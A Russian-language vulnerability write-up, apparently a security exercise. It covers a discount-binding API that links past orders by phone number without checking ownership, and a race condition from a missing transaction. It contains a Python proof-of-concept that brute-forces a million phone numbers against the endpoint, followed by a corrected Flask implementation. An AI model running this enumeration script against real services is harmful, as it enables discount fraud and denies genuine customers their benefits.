4. Конкретное описание уязвимости
функция `bind_old_orders` привязывает заказы используя только номер телефона, не проверяя что номер принадлежит текущему пользователю следовательно мы можем указать любой номер телефона который совершал заказ и получить скидку больше чем должна быть на самом деле, и вся защита находится в браузере, то есть если мы сами отправим запрос, через бурп то обойдем браузерную защиту и сможем получить дополнительную скидку на наш аккаунт 
Максимальный реальный риск:
Пользователь может привязать старые заказы с других номеров получить самую большую скидку и заблокировать настоящему заказчику возможность ее получения, так же так как нет транзакции возникает Race Conditions и если два одновременных запроса придут на один номер то их перепривяжут дважды 
Эксплуатация:
PoC:
```python
import requests

BASE_URL = "https://app.com"
API_ENDPOINT = f"{BASE_URL}/api/bind_old_orders"

cookies = {
    "session": "cookie",
    "_csrf": "csrf"
}

headers = {
    "X-CSRF-Token": "csrfe",
    "Content-Type": "application/json",
    "Referer": BASE_URL
}

def exploit():
    start_number = 79000000000
    attempts = 1000000 

    for i in range(attempts):
        phone = str(start_number + i)
        payload = {"phone_number": phone}
        
        try:
            response = requests.post(
                API_ENDPOINT, 
                json=payload, 
                cookies=cookies, 
                headers=headers
            )
            
            if response.status_code == 200:
                print(f"Success: {phone} | Response: {response.json().get('message')}")
            else:
                print(f"Failed for {phone}: {response.status_code}")
                
        except Exception as e:
            print(f"[!] Error: {e}")
            break

if __name__ == "__main__":
    exploit()
```
С помощью этого PoС набиваем максимальную скидку,а Race Conditions нужно делать через бурп repeater
Рекомендации по устранению, необходимые замены в коде и комментарий, каким образом они обеспечат защиту. 
если проверка идет по номеру то аккаунт должен содержать номер телефона, потому что заказы привязаны по номеру можно сделать что он может быть пустым но чтобы и если хотим подтвердить заказы, то нужно сначала привязать номер а уже потом проверять на соответствие
```python
@app.route("/api/bind_old_orders", methods=["POST"])  
@auth_required  
@csrf_protect  
def bind_old_orders():  
    data = get_request_data()  
  
    phone = data.get("phone_number", "").strip()  
    username = g.user["sub"]  
  
    if not phone:  
        return jsonify(error="phone number required"), 400  
  
    try:  
        db.execute("BEGIN IMMEDIATE")  
  
        user = db.execute(  
            "SELECT username, phone_number FROM users WHERE username = ?",  
            (username,)  
        ).fetchone()  
  
        if not user:  
            db.rollback()  
            return jsonify(error="user not found"), 404  
  
        if user["phone_number"] != phone:  
            db.rollback()  
            return jsonify(error="phone number not for this user"), 403  
  
        row = db.execute(  
            "SELECT username, discount, add_old_orders, orders_count FROM discount WHERE username = ?",  
            (username,)  
        ).fetchone()  
  
        if row["add_old_orders"] != 1:  
            db.rollback()  
            return jsonify(error="old orders already"), 409  
  
        rows = db.execute("SELECT id FROM orders WHERE phone_number = ? AND is_registered = 0",(phone,)).fetchall()  
  
        orders_count = row["orders_count"] + len(rows)  
              
        if orders_count > 20:  
            discount = 25  
        elif orders_count > 15:  
            discount = 20  
        elif orders_count > 10:  
            discount = 15  
        elif orders_count > 5:  
            discount = 10  
        else:  
            discount = 0  
        
        # применяем изменения для заказов
        db.execute("UPDATE orders SET is_registered = 1 WHERE phone_number = ? and is_registered = 0", (phone,))  
  
		# обновляем скидкцу для пользвателя
        db.execute(  
            "UPDATE discount SET orders_count = ?, discount = ?, add_old_orders = 0 WHERE username = ?",  
            (orders_count, discount, username)  
        )  
  
        db.commit()  
  
        return jsonify(message="discount info updated")  
  
    except Exception as e:  
        db.rollback()  
        return jsonify(error=f"error binding old orders: {str(e)}"), 500

```
